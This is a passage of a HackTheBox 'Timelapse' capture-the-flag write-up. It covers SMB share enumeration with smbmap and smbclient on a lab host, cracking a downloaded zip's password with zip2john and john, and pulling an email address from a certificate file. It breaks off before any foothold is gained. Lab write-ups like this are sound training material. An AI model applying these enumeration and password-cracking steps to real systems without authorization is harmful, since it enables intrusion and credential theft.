### TimeLapse HackTheBox

### Difficulty = Easy

### IP Address  = 10.10.11.152

Nmap Scan:

```
```

Checking smb shows we have only read access over the Share `shares` in smb

```
┌──(venv)─(mark__haxor)-[~/Downloads]
└─$ smbmap -H 10.10.11.152 -u lol 
[+] Guest session       IP: 10.10.11.152:445    Name: 10.10.11.152                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        Shares                                                  READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share 
```

I'll connect to it and list what it has in there

```
┌──(venv)─(mark__haxor)-[~/Downloads]
└─$ smbclient  //10.10.11.152/Shares
Password for [WORKGROUP\mark]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Oct 25 16:39:15 2021
  ..                                  D        0  Mon Oct 25 16:39:15 2021
  Dev                                 D        0  Mon Oct 25 20:40:06 2021
  HelpDesk                            D        0  Mon Oct 25 16:48:42 2021

                6367231 blocks of size 4096. 1287701 blocks available
smb: \> cd Dev
smb: \Dev\> ls
  .                                   D        0  Mon Oct 25 20:40:06 2021
  ..                                  D        0  Mon Oct 25 20:40:06 2021
  winrm_backup.zip                    A     2611  Mon Oct 25 16:46:42 2021

                6367231 blocks of size 4096. 1287701 blocks available
smb: \Dev\> cd ..
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
getting file \Dev\winrm_backup.zip of size 2611 as Dev/winrm_backup.zip (3.6 KiloBytes/sec) (average 3.6 KiloBytes/sec)
getting file \HelpDesk\LAPS.x64.msi of size 1118208 as HelpDesk/LAPS.x64.msi (362.8 KiloBytes/sec) (average 295.1 KiloBytes/sec)
getting file \HelpDesk\LAPS_Datasheet.docx of size 104422 as HelpDesk/LAPS_Datasheet.docx (110.1 KiloBytes/sec) (average 258.1 KiloBytes/sec)
getting file \HelpDesk\LAPS_OperationsGuide.docx of size 641378 as HelpDesk/LAPS_OperationsGuide.docx (546.5 KiloBytes/sec) (average 315.3 KiloBytes/sec)
getting file \HelpDesk\LAPS_TechnicalSpecification.docx of size 72683 as HelpDesk/LAPS_TechnicalSpecification.docx (76.0 KiloBytes/sec) (average 282.0 KiloBytes/sec)
smb: \> 
```

The Dev directory has a winrm_backup.zip file but its password protected

```
┌──(venv)─(mark__haxor)-[~/_/B2B/HTB/Timelapse/Dev]
└─$ ls   
winrm_backup.zip
                                                                                                                                                                                                                   
┌──(venv)─(mark__haxor)-[~/_/B2B/HTB/Timelapse/Dev]
└─$ unzip winrm_backup.zip 
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password: 
   skipping: legacyy_dev_auth.pfx    incorrect password
```

I'll brute force the zip file 

```
┌──(venv)─(mark__haxor)-[~/_/B2B/HTB/Timelapse/Dev]
└─$ zip2john winrm_backup.zip > hash
ver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683 ts=72AA cs=72aa type=8
                                                                                                                                                                                                                   
┌──(venv)─(mark__haxor)-[~/_/B2B/HTB/Timelapse/Dev]
└─$ john -w=/home/mark/Documents/rockyou.txt hash 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)     
1g 0:00:00:00 DONE (2023-02-07 04:26) 1.724g/s 5981Kp/s 5981Kc/s 5981KC/s surkerior..suppamas
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Now with the password i can unzip the file

```
┌──(venv)─(mark__haxor)-[~/_/B2B/HTB/Timelapse/Dev]
└─$ file legacyy_dev_auth.pfx 
legacyy_dev_auth.pfx: data
                                                                                                                                                                                                                   
┌──(venv)─(mark__haxor)-[~/_/B2B/HTB/Timelapse/Dev]
└─$ strings legacyy_dev_auth.pfx    
_       Er
C(!,
4bz'
`o<l
|Y4W
I0{Q
L(vqQ#
{q[l"8
`+$DOC
hK*y
;5UERr
X!+3
&JCy
$-1f
NAM'u
"-r$$
Legacyy0
211025140552Z
311025141552Z0
Legacyy0
r"*J0:
cZK3
".G,
x0v0
legacyy@timelapse.htb0
}J5~f
t{(lz
5&8H
&4<6
kj@1
uUh2s
```

It's just a data file but we geta valid email `legacyy@timelapse.htb`

I'll check the other directory
